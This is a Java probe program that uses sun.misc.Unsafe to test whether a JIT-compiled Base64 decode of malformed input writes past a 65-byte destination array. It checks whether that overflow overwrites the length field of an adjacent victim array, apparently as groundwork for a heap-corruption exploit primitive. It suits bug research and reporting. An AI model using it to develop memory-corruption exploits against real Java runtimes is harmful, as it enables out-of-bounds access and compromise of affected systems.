import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

/**
 * Why does a single dst[65]/vic[64] pair corrupt, but 16 pairs do not?
 * Prints the real distance between each dst and its intended victim, and
 * whether the spill actually landed.
 */
public final class Layout {
    private static volatile int sink;
    private static sun.misc.Unsafe u;

    static int len(byte[] b) { return u.getInt(b, 12); }
    static long addr(byte[] b) {
        Object[] a = new Object[] { b };
        return u.getLong(a, u.arrayBaseOffset(Object[].class));
    }

    public static void main(String[] args) throws Exception {
        Field uf = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        uf.setAccessible(true);
        u = (sun.misc.Unsafe) uf.get(null);

        Base64.Decoder d = Base64.getDecoder();
        byte[] valid = "A".repeat(64).getBytes(StandardCharsets.US_ASCII);
        byte[] bad = ("A".repeat(64) + "=").getBytes(StandardCharsets.US_ASCII);
        byte[] warm = new byte[4096];
        for (int i = 0; i < 200_000; i++) sink += d.decode(valid, warm);

        System.out.println("=== case A: local single pair (OneShot style) ===");
        {
            byte[] dst = new byte[65];
            byte[] vic = new byte[64];
            System.out.printf("  dist=%d  before vic.len=%d%n", addr(vic) - addr(dst), len(vic));
            try { d.decode(bad, dst); } catch (IllegalArgumentException e) { }
            System.out.printf("  after  vic.len=%d (0x%08x)%n", len(vic), len(vic));
        }

        System.out.println("=== case B: array-of-arrays, dst[i] then wri[i] ===");
        {
            final int N = 8;
            byte[][] dst = new byte[N][], wri = new byte[N][];
            for (int i = 0; i < N; i++) {
                dst[i] = new byte[65];
                wri[i] = new byte[64];
            }
            for (int i = 0; i < N; i++) {
                System.out.printf("  pair%d dist=%d%n", i, addr(wri[i]) - addr(dst[i]));
            }
            for (int i = 0; i < N; i++) {
                try { d.decode(bad, dst[i]); } catch (IllegalArgumentException e) { }
            }
            for (int i = 0; i < N; i++) {
                System.out.printf("  pair%d afterLen=%d (0x%08x) mark=0x%016x%n",
                        i, len(wri[i]), len(wri[i]), u.getLong(wri[i], 0));
            }
        }

        System.out.println("=== case C: allocate+decode interleaved ===");
        {
            final int N = 8;
            byte[][] dst = new byte[N][], wri = new byte[N][];
            for (int i = 0; i < N; i++) {
                dst[i] = new byte[65];
                wri[i] = new byte[64];
                try { d.decode(bad, dst[i]); } catch (IllegalArgumentException e) { }
            }
            for (int i = 0; i < N; i++) {
                System.out.printf("  pair%d afterLen=%d (0x%08x)%n", i, len(wri[i]), len(wri[i]));
            }
        }

        System.out.println("=== case D: what sits after dst[0]? dump 128 bytes ===");
        {
            byte[] dst = new byte[65];
            byte[] vic = new byte[64];
            Arrays.fill(vic, (byte) 0x5a);
            try { d.decode(bad, dst); } catch (IllegalArgumentException e) { }
            StringBuilder sb = new StringBuilder();
            for (int i = 80; i < 112; i++) sb.append(String.format("%02x ", u.getByte(dst, i) & 0xff));
            System.out.println("  dst[80..111] (i.e. past the object) = " + sb);
        }
    }
}
